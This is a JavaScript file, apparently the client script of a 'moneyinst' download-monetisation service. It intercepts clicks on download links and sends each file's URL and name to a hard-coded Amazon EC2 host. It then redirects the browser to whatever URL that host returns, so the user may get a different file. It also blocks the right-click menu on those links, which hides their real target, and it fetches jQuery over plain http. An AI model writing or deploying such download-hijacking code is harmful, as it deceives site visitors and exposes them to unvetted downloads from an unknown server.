(function(funcName, baseObj) {
  // The public function name defaults to window.docReady
  // but you can pass in your own object and own function name and those will be used
  // if you want to put them in a different namespace
  funcName = funcName || "docReady";
  baseObj = baseObj || window;
  var readyList = [];
  var readyFired = false;
  var readyEventHandlersInstalled = false;

  // call this when the document is ready
  // this function protects itself against being called more than once
  function ready() {
    if (!readyFired) {
      // this must be set to true before we start calling callbacks
      readyFired = true;
      for (var i = 0; i < readyList.length; i++) {
        // if a callback here happens to add new ready handlers,
        // the docReady() function will see that it already fired
        // and will schedule the callback to run right after
        // this event loop finishes so all handlers will still execute
        // in order and no new ones will be added to the readyList
        // while we are processing the list
        readyList[i].fn.call(window, readyList[i].ctx);
      }
      // allow any closures held by these functions to free
      readyList = [];
    }
  }

  function readyStateChange() {
    if (document.readyState === "complete") {
      ready();
    }
  }

  // This is the one public interface
  // docReady(fn, context);
  // the context argument is optional - if present, it will be passed
  // as an argument to the callback
  baseObj[funcName] = function(callback, context) {
    // if ready has already fired, then just schedule the callback
    // to fire asynchronously, but right away
    if (readyFired) {
      setTimeout(function() {
        callback(context);
      }, 1);
      return;
    } else {
      // add the function and context to the list
      readyList.push({
        fn: callback,
        ctx: context
      });
    }
    // if document already ready to go, schedule the ready function to run
    if (document.readyState === "complete") {
      setTimeout(ready, 1);
    } else if (!readyEventHandlersInstalled) {
      // otherwise if we don't have event handlers installed, install them
      if (document.addEventListener) {
        // first choice is DOMContentLoaded event
        document.addEventListener("DOMContentLoaded", ready, false);
        // backup is window load event
        window.addEventListener("load", ready, false);
      } else {
        // must be IE
        document.attachEvent("onreadystatechange", readyStateChange);
        window.attachEvent("onload", ready);
      }
      readyEventHandlersInstalled = true;
    }
  }
})("docReady", window);

docReady(miCheckjQuery);

function miCheckjQuery() {
  if (typeof jQuery != 'undefined') {
    mi_init(jQuery);
  } else {
    miGetjQuery('http://code.jquery.com/jquery.min.js', mi_init);
  }
}

function miGetjQuery(url, success) {
  var script = document.createElement('script');
  script.src = url;
  var head = document.getElementsByTagName('head')[0],
    done = false;
  // Attach handlers for all browsers
  script.onload = script.onreadystatechange = function() {
    if (!done && (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete')) {
      done = true;
      success(jQuery);
      script.onload = script.onreadystatechange = null;
      head.removeChild(script);
    }
  };
  head.appendChild(script);
}

function mi_init($) {
  function absolutePath(href) {
    if (href.substr(0, 4) !== 'http') {
      if (href.substr(0, 1) !== '/') {
        var path = window.location.pathname;
        if (path.substr(0, 1) !== '/') {
          path = '/' + path;
        }
        if (path.substr(-1) !== '/') {
          path = path + '/';
        }
        href = window.location.protocol + '//' + window.location.host + path + href;
      } else {
        href = window.location.protocol + '//' + window.location.host + href;
      }
    }
    return href;
  }

  function get_mi_api_link(type, sid, name, href) {
    var result = 'http://ec2-54-154-112-209.eu-west-1.compute.amazonaws.com/';
    if (window.location.protocol == 'http:') {
      result += 'api/download_url/';
    } else {
      result += 'api/download2/';
    }
    if (type != undefined && type != "") result += type + '/';
    if (sid != undefined && sid != "") result += sid + '/';
    if (name != undefined && name != "") result += encodeURIComponent(name) + '/';
    if (href != undefined && href != "") result += encodeURIComponent(href);
    return result;
  }

  function get_mi_api_link_php(type, sid, name, href) {
    window.location.href =  '/moneyinst/mi_request.php?' + 'sid=' + sid +
      '&url=' + encodeURIComponent(href) + '&name=' + encodeURIComponent(name) +
      '&type=' + type + '&href=' + encodeURIComponent(href) + '&b64=0';
    return false;
  }

  function get_mi_filename(url) {
    var re = /([^\/]+?)(?:\?.*)?$/;
    var result = re.exec(url)
    if (result[1] != undefined) {
      return result[1];
    } else {
      return false;
    }
  }

  function get_mi_filetype(name) {
    var types_lists = {
      '1': '.7z.bz2.cab.deb.jar.rar.rpm.tar.zip.',
      '3': '.3gp.aaf.asf.flv.mkv.mov.mpeg.qt.wmv.hdv.mpeg4.mp4.dvd.mxf.avi.',
      '4': '.aac.asf.cda.fla.mp3.ogg.wav.wma.cd.ac3.dts.flac.midi.mod.aud.',
      '5': '.bmp.cpt.gif.jpeg.jpg.jp2.pcx.png.psd.tga.tpic.tiff.tif.wdp.hdp.cdr.svg.ico.ani.cur.xcf.',
      '6': '.torrent.',
      '7': '.apk.',
      '8': '.ps.eps.pdf.doc.txt.rtf.djvu.opf.chm.sgml.xml.fb2.fb3.tex.lit.exebook.prc.epub.',
      '9': '.img.iso.nrg.mdf.uif.bin.cue.daa.pqi.cso.ccd.sub.wim.swm.rwm.'
    };
    var re = /[^.]+\.([^.?]+)(?:\?.*)?$/;
    var result = re.exec(name)
    if (result[1] != undefined) {
      var ext = '.' + result[1] + '.';
    } else {
      return 2;
    }
    for (key in types_lists) {
      if (types_lists[key].indexOf(ext) != -1) {
        return key;
      }
    }
    return 2;
  }

  $(document).on('contextmenu', function(e) {
    if ($(e.target).is(".mi-download-link") || $(e.target).parents(".mi-download-link").length != 0) {
      return false;
    } else {
      return true;
    }
  });
  $(".mi-download-link").click(function() {
    var href = $(this).attr("href");
    var url = $(this).attr("download_url");
    if (url === undefined) {
      url = href;
    }
    url = absolutePath(url);
    url = url.trim();
    var name = $(this).attr("download_name");
    if (name !== undefined) {
      name = name.replace(/[\/\\:*?<>|]/gi, '_');
    } else {
      name = get_mi_filename(url);
    }
    if (!name) return true;
    var type = get_mi_filetype(name);
    var api_url = get_mi_api_link(type, $(this).attr("download_sid"), name, url);
    if (!api_url) return false;
    if (window.location.protocol == 'https:') {
      window.location.href = api_url;
      return false;
    }
    var request = $.ajax({
      url: api_url,
      success: function(data) {
        if (data && data != '' && /^http[s]?:\/\/.+\..{2,6}\/.*$/.test(data)) {
          window.location.href = data;
        } else {
          window.location.href = href;
        }
      },
      error: function(xhr, desc, err) {
        window.location.href = href;
      }
    });
    return false;
  });

  (function(a) {
    if (typeof define === 'function' && define.amd) {
      define(['jquery'], a)
    } else if (typeof exports === 'object') {
      module.exports = a(require('jquery'))
    } else {
      a(jQuery)
    }
  }(function($) {
    if ($.support.cors || !$.ajaxTransport || !window.XDomainRequest) {
      return
    }
    var n = /^https?:\/\//i;
    var o = /^get|post$/i;
    var p = new RegExp('^' + location.protocol, 'i');
    $.ajaxTransport('* text html xml json', function(j, k, l) {
      if (!j.crossDomain || !j.async || !o.test(j.type) || !n.test(j.url) || !p.test(j.url)) {
        return
      }
      var m = null;
      return {
        send: function(f, g) {
          var h = '';
          var i = (k.dataType || '').toLowerCase();
          m = new XDomainRequest();
          if (/^\d+$/.test(k.timeout)) {
            m.timeout = k.timeout
          }
          m.ontimeout = function() {
            g(500, 'timeout')
          };
          m.onload = function() {
            var a = 'Content-Length: ' + m.responseText.length + '\r\nContent-Type: ' + m.contentType;
            var b = {
              code: 200,
              message: 'success'
            };
            var c = {
              text: m.responseText
            };
            try {
              if (i === 'html' || /text\/html/i.test(m.contentType)) {
                c.html = m.responseText
              } else if (i === 'json' || (i !== 'text' && /\/json/i.test(m.contentType))) {
                try {
                  c.json = $.parseJSON(m.responseText)
                } catch (e) {
                  b.code = 500;
                  b.message = 'parseerror'
                }
              } else if (i === 'xml' || (i !== 'text' && /\/xml/i.test(m.contentType))) {
                var d = new ActiveXObject('Microsoft.XMLDOM');
                d.async = false;
                try {
                  d.loadXML(m.responseText)
                } catch (e) {
                  d = undefined
                }
                if (!d || !d.documentElement || d.getElementsByTagName('parsererror').length) {
                  b.code = 500;
                  b.message = 'parseerror';
                  throw 'Invalid XML: ' + m.responseText;
                }
                c.xml = d
              }
            } catch (parseMessage) {
              throw parseMessage;
            } finally {
              g(b.code, b.message, c, a)
            }
          };
          m.onprogress = function() {};
          m.onerror = function() {
            g(500, 'error', {
              text: m.responseText
            })
          };
          if (k.data) {
            h = ($.type(k.data) === 'string') ? k.data : $.param(k.data)
          }
          m.open(j.type, j.url);
          m.send(h)
        },
        abort: function() {
          if (m) {
            m.abort()
          }
        }
      }
    })
  }));
};
